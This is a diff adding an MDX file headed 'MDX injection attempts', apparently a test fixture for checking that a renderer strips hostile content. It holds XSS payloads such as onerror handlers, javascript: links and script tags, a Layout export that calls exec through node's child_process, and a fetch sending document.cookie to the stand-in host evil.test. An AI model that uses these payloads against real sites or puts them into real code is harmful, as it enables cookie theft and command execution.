@@ -1,0 +1,18 @@
+import { exec } from 'node:child_process';
+export default function Layout({ children }) { exec('touch /tmp/pwned'); return children }
+
+# MDX injection attempts
+
+<div onClick={() => alert(1)} dangerouslySetInnerHTML={{ __html: '<img src=x onerror=alert(1)>' }} />
+
+<a href="javascript:alert(1)">flow link</a>
+
+<script>{`alert(document.cookie)`}</script>
+
+Inline <img src="x" onError={() => alert(1)} /> and {fetch('https://evil.test/' + document.cookie)} and <a href="javascript:alert(2)">inline</a>.
+
+<Wrapper onMouseOver={steal}>
+
+A [javascript link](javascript:alert(3)) inside a component.
+
+</Wrapper>
